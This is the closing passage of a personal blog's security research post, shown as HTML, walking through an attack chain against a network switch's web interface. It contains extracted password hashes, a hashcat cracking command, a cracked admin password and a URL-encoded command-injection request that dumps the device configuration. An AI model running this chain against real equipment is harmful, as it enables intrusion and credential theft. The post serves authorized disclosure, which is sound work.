+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Extract USER_SUMMARY textarea</span>
+</span></span><span style="display:flex;"><span>grep -A <span style="color:#ae81ff">5</span> <span style="color:#e6db74">&#34;USER_SUMMARY&#34;</span> useraccounts.shtml
+</span></span></code></pre></div><p><strong>Step 3: Parse password hashes</strong></p>
+<pre tabindex="0"><code>Admin user:
+  Username: admin
+  Privilege: 15 (full admin)
+  Hash Type: 5 (MD5-crypt)
+  Hash: $1$P4Bi$8t74cAAknpCiVCvL7IC6T.
+  Strength: WEAK - Deprecated algorithm, easily crackable
+
+Read-only user:
+  Username: vulntest
+  Privilege: 5 (read-only)
+  Hash Type: 9 (scrypt)
+  Hash: $9$wLzi8Cmi6aH91k$qOAH1kOzmLhTX1tKqGx/BMhZ.2x3lvdlck6l3ES8.1.
+  Strength: STRONG - Modern algorithm
+</code></pre><hr>
+<h2 id="the-complete-attack-chain">The Complete Attack Chain
+</h2><h3 id="phase-1-initial-access">Phase 1: Initial Access
+</h3><pre tabindex="0"><code>Attacker obtains read-only credentials
+• Default credentials (cisco/cisco)
+• Weak passwords (guessable)
+• Social engineering
+
+Login: vulntest / vulntest
+Privilege Level: 5 (Read-Only)
+</code></pre><h3 id="phase-2-information-disclosure">Phase 2: Information Disclosure
+</h3><pre tabindex="0"><code>Access admin page (no access control!)
+GET https://192.168.103.143/useraccounts.shtml
+
+Extract from HTML source:
+username admin privilege 15 secret 5 $1$P4Bi$8t74cA...
+
+Hash identified: MD5-crypt (WEAK)
+</code></pre><h3 id="phase-3-offline-password-cracking">Phase 3: Offline Password Cracking
+</h3><pre tabindex="0"><code>Run hashcat with GPU acceleration:
+hashcat -m 500 -a 0 hash.txt rockyou.txt
+
+Crack time: 15 minutes (common wordlist + GPU)
+
+Cracked password: Stephen13
+</code></pre><h3 id="phase-4-admin-access">Phase 4: Admin Access
+</h3><pre tabindex="0"><code>Login: admin / Stephen13
+Privilege Level: 15 (Full Admin)
+
+✓ Full web interface access
+✓ Can create/delete users
+✓ Can modify configuration
+</code></pre><h3 id="phase-5-remote-code-execution">Phase 5: Remote Code Execution
+</h3><pre tabindex="0"><code>Use GET-based RCE endpoint:
+GET /%24b%0A?b=show%20running-config
+
+Extract:
+✓ All user passwords and hashes
+✓ SNMP community strings
+✓ Enable secret
+✓ Network topology and VLANs
+✓ Switch interconnections (CDP/LLDP)
+
+ COMPLETE DEVICE COMPROMISE
+</code></pre><hr>
+<p><strong>Disclaimer:</strong> This assessment was performed on authorized equipment for security research purposes. All findings are reported in good faith to improve security. The vulnerabilities described should only be tested on systems you own or have explicit authorization to test.</p>
+<p><em>This post is part of my ongoing ICS security research. For more projects and research, visit the <a class="link" href="/page/ics-projects/" >ICS Projects</a> page.</em></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Stephen&#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
